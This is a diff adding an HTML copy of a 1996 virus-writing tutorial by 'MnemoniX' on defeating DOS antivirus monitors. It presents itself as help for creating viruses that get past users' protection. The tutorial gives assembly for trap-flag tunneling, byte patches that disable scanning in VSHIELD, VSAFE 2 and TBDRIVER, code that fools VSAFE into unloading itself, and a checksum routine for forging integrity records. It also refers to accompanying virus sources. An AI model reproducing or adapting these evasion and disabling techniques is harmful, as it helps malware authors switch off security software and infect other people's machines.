@@ -1,0 +1,450 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Anti-Anti-virus Tricks (Mnemonix)</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>ANTI-Anti-Virus Tricks<BR>
+by<BR>
+MnemoniX<BR>
+Version 1.00 - 1/96</FONT></FONT></B><BR>
+</P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>        Improved antivirus programs got you down? Don't worry - with the help
+of this file you can create a virus that will surpass the protection of most
+computers out there, computers whose hapless users are convinced are truly
+&quot;protected.&quot;
+
+Before we begin, I must first introduce the concept of ...
+
+                           ***********************
+                           * RECURSIVE TUNNELING *
+                           ***********************
+
+        Recursive tunneling is the practice of tracing the code attached to
+a particular interrupt and finding the original DOS or BIOS code, surpassing
+all resident programs (AV monitors included.) This involves using the trap
+flag in the flags register, which can be turned on with the following code:
+
+                                mov     ax,100h ; set bit 8 (trap flag)
+                                push    ax
+                                popf
+
+        Once this trap flag is set, a type 1 interrupt is generated after
+each instruction. We can catch this interrupt and trace the interrupt 21h
+code, for example, by calling interrupt 21 with the trap flag on. (Note that
+you must CALL the interrupt 21h routine, and not run it using INT 21h;
+otherwise, the trap flag is automatically turned off when the INT instruction
+is run.) To find the original DOS or BIOS code, then, one must:
+
+                1) Attach a tunneling routine to interrupt 1.
+                2) Find the original segment of the DOS or BIOS code
+                   we are tracing. (there are various ways to do this)
+                3) Set the trap flag.
+                4) Call the interrupt routine (NOT with an INT). Do it like
+                   this:
+
+                        xor     ax,ax
+                        mov     ds,ax
+                        pushf
+                        call    dword ptr ds:[21h * 4]  ; calls INT 21h
+
+                5) Tunneling routine should trace code until original DOS
+                   or BIOS segment is reached by continually checking segment
+                   of current instruction. Once DOS or BIOS segment is
+                   reached, the current offset must be saved and tunneling
+                   routine stops checking code.
+                6) Clear trap flag by clearing bit 8 in flags.
+
+
+        When address of original interrupt is found, the interrupt may be
+called without the resident programs in memory knowing anything about it.
+
+        A note: The trap flag may be turned off by a POPF or IRET instruction,
+which will screw up your routine. To prevent this, you must check the current
+instruction and see if it is a POPF or IRET. If so, we must set bit 8 of the
+flags value on the stack BEFORE the POPF or IRET is processed, to make sure
+the trap flag stays set. (An interrupt call saves the flags value on the
+stack, and thus the flags are popped after CS:IP when an IRET instruction is
+run. In case you didn't know.)
+
+        Similarly, you can partially hide the existence of your tunneling
+routine. Whenever an INT, INTO, or PUSHF instruction is reached, you can
+alter the value on the stack after the instruction is run. This is generally
+not necessary, however, and does not totally hide the tunneling routine
+anyway - there are many other ways to generate an interrupt, thus causing the
+flags value to be saved and the trap discovered.
+
+        Recursive tunneling will enable you to engage in questionable actions
+without knowledge of AV programs. However, this does not render these actions
+undetectable. TBDRIVER, for example, can detect and warn the user of a
+recursive tunneling routine. And although VSAFE can't find a tunneling rou-
+tine, it can detect changes to a program when the program is run again. So
+what does one do to make these programs look the other way?
+
+This is where we introduce the concept of ...
+
+                                ************
+                                * PATCHING *
+                                ************
+
+        Patching involves fixing up a resident program to alter its perfor-
+mance. If a hypothetical program is to scan for viruses every time a program
+is run, it could capture interrupt 21h, and somewhere along the line it could
+use code like this to scan every program being run :
+
+int_21_code:                            ; called when interrupt 21h is called
+                cmp     ah,4Bh          ; is a program being executed?
+                je      scan_program    ; if so, scan it
+
+                jmp     original_int_21 ; if not, ignore it
+
+        This program's ability to scan for viruses is dependent upon the JE
+instruction that checks for every call to interrupt 21h with AH=4Bh (the DOS
+program execution function.)
+
+        Now, if you wanted to deactivate this program, you could search for
+this little snippet of code when you tunnel through interrupt 21h, and upon
+finding it, change the two-byte JE instruction into two NOP's:
+
+int_21_code:
+                cmp     ah,4Bh          ; is a program being executed?
+                nop                     ; doesn't matter, because even if it
+                nop                     ; was we would return to the original
+                                        ; interrupt 21h anyway
+                jmp     original_int_21 ; see?
+
+        After this is done, the program won't find ANY viruses, and it becomes
+a waste of memory - all because two bytes were changed!
+
+        Note that if this same program caught interrupt 13h, or also checked
+programs as they were opened, it would still do these things. We have simply
+prevented the program from checking programs as they are executed. In many
+cases, a single patch like this will suffice.
+
+        This is the essence of patching, and an example of using patching in a
+tunneling routine to deactivate certain popular AV programs is found in the
+program AV-KILL.ASM. This checks for the existence of TBDRIVER, VSAFE, and
+VSHIELD in memory, and patches them if they are found.
+
+And now, I will discuss the various ways to defeat individual virus scanners.
+I should note that these are based on SPECIFIC VERSIONS of SPECIFIC MONITORS,
+and will NOT work for every version of every monitor. These may be updated as
+new monitors come out.
+
+                             ********************
+                             * VSHIELD (McAfee) *
+                             ********************
+
+        Do you really need to guard against VSHIELD? Well, a new virus will
+never be detected by VSHIELD, but future versions may be able to scan for
+that same virus. Fortunately, VSHIELD is quite easy to disarm and render
+useless.
+
+PATCHING VSHIELD
+
+        This patch will prevent VSHIELD from detecting any viruses. This
+was tested on VSHIELD V106 - an old version - and probably will not work
+on every version, but what the hell. There is a portion of the code which
+looks like this:
+
+        80 FC 0E        cmp     ah,0E
+        74 06           je      0A1C
+        80 FC 4B        cmp     ah,4B
+        74 09           je      0A24
+
+        To fix this up, you can :
+
+        replace the first byte (80) with CB (a RET)
+
+        OR
+
+        replace the second JZ (74 09) with two NOP's (90 90)
+
+Either way VSHIELD will no longer scan files as they are executed.
+
+How can you get the original host program past VSHIELD, before VSHIELD has
+been patched? Just encrypt it or PKLITE it. Simple enough.
+
+                ****************************************************
+                * VSAFE versions 1 and 2 (Central Point/Microsoft) *
+                ****************************************************
+
+        While VSAFE 1.0 was conquered a long time ago, not much seems to have
+been done to hack VSAFE 2. Making a virus or hacked program VSAFE-resistant
+will make it much more viable, since it is a popular AV monitor. The old
+tricks that could be played on VSAFE 1 (which was pure crapware) no longer
+work like they used to. Here is what I was able to find though a little bit of
+investigation ... (BTW, this was tested on MSAV 1.0 and CPAV 2.2. It should
+be similar for other versions except where noted.)
+        Firstly, as with all versions, one can check for the presence of VSAFE
+in memory with the following code:
+
+                        mov     ax,0FA00h
+                        mov     dx,5945h        (&quot;VS&quot;)
+                        int     16h
+
+        If DI = 4559h (&quot;SV&quot;), VSAFE is present. Functions 16/FA03 and 16/FA08
+will return constant values whose significance is unbeknownst to me - they
+don't seem to be version numbers.
+        Next, the old trick which deinstalled VSAFE, which was the same as the
+above code except AX = FA01h, won't cut it anymore. Nor will it change the
+VSAFE flags anymore when AX = FA02h. Does this mean that the you can no longer
+make VSAFE turn the other way? Hardly - there are still ways around it.
+(Remember, _no_ program is immune to being duped.)
+        The two functions to deinstall or change VSAFE options are still there,
+but now there's a twist: It checks to see which program is running before it
+will act. This is a pain to get around, but not impossible. You can find the
+name of the current resident program in the DOS environment, which is found
+by getting the DOS environment segment (at offset 2Ch in the PSP), finding
+the name of the current program (the environment table is at offset 0, then
+two zero bytes signal the end of it, and then there's another two bytes, after
+which the name of the current program is found) and changing it to
+&quot;\VSAFE.EXE&quot;.
+        Actually, you don't even need to go to all that trouble. You see,
+VSAFE doesn't actually check the filename; it just makes a checksum of the
+letters in the filename minus extension. I am hesitant to go into the details
+of this now; if you want to see how the checksum works examine it yourself.
+Suffice it to say that if, before the period in the filename, you insert the
+three-byte hex string 5CFF76, VSAFE will think it's being loaded. Do I hear
+cries for an example?
+
+                mov     ax,ds:[2Ch]             ; get environment segment
+                mov     es,ax
+
+                xor     di,di                   ; after the table of environ-
+                mov     cx,17D0h                ; ment strings, we will find
+                xor     al,al                   ; the current program name
+
+find_environ_end:
+                repnz   scasb                   ; scan through environment
+                cmp     byte ptr es:[di],0      ; end of table?
+                jnz     find_environ_end
+
+                add     di,3                    ; address of program name
+                mov     al,'.'                  ; find extension
+                repnz   scasb                   ; extension found
+
+                mov     si,es:[di - 3]          ; save orig. program name
+                mov     es:[di - 3],76FFh       ; modify program name
+                mov     bh,es:[di - 4]          ; make VSAFE think it is
+                mov     byte ptr es:[di - 4],5Ch ; calling itself
+
+; VSAFE 2 may now be unloaded
+
+                mov     ax,0FA01h               ; unload VSAFE
+                mov     dx,5945h
+                int     16h
+
+; fix up program name again
+
+                mov     es:[di - 3],si          ; replace orig. program name
+                mov     es:[di - 4],bh
+
+        Here is a listing of all the VSAFE functions you need to know.
+
+        (All functions called by INT 16h with DX = 5945h)
+          AX = FA00h - Test for VSAFE resident
+                        DI=4559h on return is res.
+          AX = FA01h - Deinstall VSAFE
+          AX = FA02h - Change VSAFE flag settings
+                        BL=bits 0-7 represent settings for flags 1-8, resp.
+                        on return, CL holds previous flag setting
+          AX = FA05h - Turn popup menu on/off
+                        BL=0 (on) or 1 (off)
+
+        Version 2 checks name of program currently running before executing
+        functions FA01, FA02 or FA05.
+
+        Deinstalling VSAFE works well if nothing is loaded after it in
+memory. However, this may not be the case, and if other programs are loaded
+VSAFE gives an error message. Hence I don't consider this the best way to
+deactivate the program. A better way would be to patch up VSAFE as described
+below, and upon writing the disk, save the VSAFE flags and switch them all
+off, then restore when done. This should keep it quiet.
+        If you're too lazy to mess around with that, there's an even easier
+way. The flag status byte in VSAFE 2 is located at offset 0F1Dh in the code,
+and you can modify it directly upon finding VSAFE's segment (check INT 16h's
+segment.) This particular method will only work for version 2.2; the address
+is probably different for other versions.
+        Moving on, one will find that the old CHKLIST.CPS files have now been
+replaced by SMARTCHK.CPS files, which have a different format. (The MSAV
+equivalents of these files are CHKLIST.MS and SMARTCHK.MS, respectively.) Each
+record is 60 bytes long, and consists of the following data:
+
+                Data                            Offset  Length
+                ----------------------------------------------
+                ASCIIZ filename                 0       13
+                File attributes                 13      1
+                File size                       14      4
+                File time                       18      2
+                File date                       20      2
+                First 32 bytes of file          22      32
+                Checksum data                   54      4
+                Apparently always set to zero.  58      2
+
+        Now, a VSAFE-smart virus could increase its stealthiness by modifying
+this data, which isn't as much of a pain as it may sound. It could modify the
+filenames, so VSAFE no longer properly checks the programs. A more ambitious
+programmer could look for the filename, change the first few recorded bytes of
+the file, change the date, and fix the checksum. But how do we calculate the
+checksum, you ask? Good question. The checksum routine in VSAFE 2 is long and
+complicated. (In case you were wondering, the VSAFE 1.0 checksum can be
+calculated like this:
+
+                DS:SI = offset of first 64 bytes of file
+                        (or if file is &lt; 64 bytes long, the entire file)
+                BX = high word of 32-bit checksum
+                DX = low word of 32-bit checksum
+                CX = 64 (for loop) or size of file if &lt; 64 bytes
+                AH = 0 (for addition)
+
+        vsafe_checksum:
+                lodsb                   ; add first byte
+                add     dx,ax
+                adc     bx,0
+                lodsb                   ; subtract second byte
+                sub     dx,ax
+                sbb     bx,0
+                lodsb                   ; XOR third byte by first checksum
+                xor     dl,al           ; byte only
+                sub     cx,3
+                cmp     cx,2
+                ja      vsafe_checksum
+
+The finished checksum is in BX:DX.) I haven't figured out the VSAFE 2 checksum
+routine yet - it's much more complicated. But you're welcome to look.
+        The included UNSAFE.ASM program is a virus, and demonstrates the
+manipulation of VSAFE flags and corruption of SMARTCHK.CPS files. As a
+demonstration, try setting the write protect flag on, and then infect a few
+files. VSAFE will not warn you of the write, because the flags are temporarily
+turned off by the virus when it spreads. Examine and learn.
+
+PATCHING VSAFE
+
+When VSAFE 2.2 is installed, it installs a routine onto interrupt 21h which
+checks for different DOS calls, as all monitors do. There is a portion of the
+interrupt 21 code which looks like this :
+
+80 FC 4B        cmp     ah,4B           ; this catches the DOS execute program
+74 62           jz      0BAF            ; call so VSAFE can do program checks
+80 FC 4C        cmp     ah,4C           ; this catches a DOS terminate program
+74 33           jz      0B85            ; call so VSAFE can check memory
+80 FC 00        cmp     ah,0            ; another terminate program call check
+74 15           jz      0B6C
+
+        If we set the trap flag, set AH to 99h (or any nonexistent function
+call), call interrupt 21 and scan the code with a tracing routine, we will
+eventually find this point. Once we do, it's quite simple to eliminate VSAFE
+checks when a program begins and ends:
+
+80 FC 4B        cmp     ah,4B
+90              nop                     ; the JZ's have been replaced with two
+90              nop                     ; NOP's each ... VSAFE will no longer
+80 FC 4C        cmp     ah,4C           ; check programs as they are run,
+90              nop                     ; or check memory when a program
+90              nop                     ; terminates, because it won't know
+80 FC 4C        cmp     ah,0            ; when these things happen anymore.
+90              nop
+90              nop
+
+        (A brief note: A program can also terminate via interrupt 20h, and
+VSAFE _will_ check memory if a program terminates this way. This interrupt
+is more difficult to tunnel - once the DOS segment is reached, the tunneling
+must be stopped - but it is not impossible. A similar patch could be created
+to solve the problem.)
+
+                               ***************
+                               * Thunderbyte *
+                               ***************
+
+TB MONITORS
+
+        All TB monitors work through TBDRIVER and hook the critical interrupts
+21h,13h, and 40h. These same monitors can be defeated by recursive tunneling
+if TBDRIVER's ability to detect such tunneling is deactivated, however.
+
+
+TBDRIVER'S DETECTION OF RECURSIVE TUNNELING
+
+        TBDRIVER is resistant to most recursive tunneling. When an interrupt
+21 is called, TBDRIVER checks the status of the trap flag for a recursive
+tunneling routine and will display a message if it is found to be set. The
+code that does this appears virtually impenetrable, and looks like this:
+
+(This is from TBDRIVER version 6.14; it may be different now but the idea
+ is basically the same.)
+
+                cli                     ; clear interrupts to prevent
+                pushf                   ; interference ...
+                cld
+                push    ax              ; what this, in essence, does is
+                push    bx              ; that is saves a value on the stack,
+                xchg    ax,bx           ; pops it, decrements the stack ptr.
+                pop     ax              ; to point to it again, pops it again,
+                dec     sp              ; and if the value changed, an int-
+                dec     sp              ; errupt must have occured. Since the
+                pop     bx              ; interrupt flag is off, the only
+                cmp     ax,bx           ; interrupt this could be is a type 1 -
+                pop     bx              ; the trap flag interrupt routine.
+                jz      02A1            ; If two values popped are different,
+                                        ; it warns the user.
+
+PATCHING TBDRIVER
+
+        Now, there is no way to fool this routine. You can't hide the change
+to the value on the stack. However, you _can_ scan for this code in your
+tunneling routine, and modify it if it is found. You could look, for example,
+for the following code in the interrupt 21 routine:
+
+5C              pop     bx
+3B C3           cmp     ax,bx
+5B              pop     bx
+74 0D           jz      02A1
+
+        If we find the string 5C 3B C3 5B 74 0D, we know TBDRIVER is present.
+The next step is modifying the code to make it useless.
+        The JZ instruction is the test. If AX and BX are equal, then the Z
+flag is set, and if the Z flag is set, the code is not being traced as far
+as TBDRIVER is concerned. Hence, you want it to act as though the Z flag was
+_always_ set. You could do this by changing the instruction to a JMP:
+
+EB 0D           jmp     02A1
+
+        Now you find the original offset of DOS's interrupt 21 with the same
+tunneling routine, and call it directly, bypassing all TB utilities.
+
+DISABLING TBSCANX
+
+        Earlier versions of TBSCANX hook INT 2Fh when they load, and install
+the following functions :
+
+        AX = CA00h      Test for installation (return FF in AL if res.)
+                        BX = 'TB'  ('tb' on return if resident)
+        AX = CA04h      Scan file
+                        DS:DX = program to be scanned
+                        (carry set means infected, ES:BX=filename)
+
+With a little work and a good debugger, you can trace the code of other AV
+monitors and find similar code in the interrupt 21h or 13h routines. If you
+know what you're doing, you could create similar patches to the ones above
+for these monitors. The same could be done with non-resident virus scanners,
+although this is a more difficult job, and not really worth it in my opinion
+since most good scanners check themselves and probably won't find any _good_
+new virus anyway.
+
+                                                - MnemoniX</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
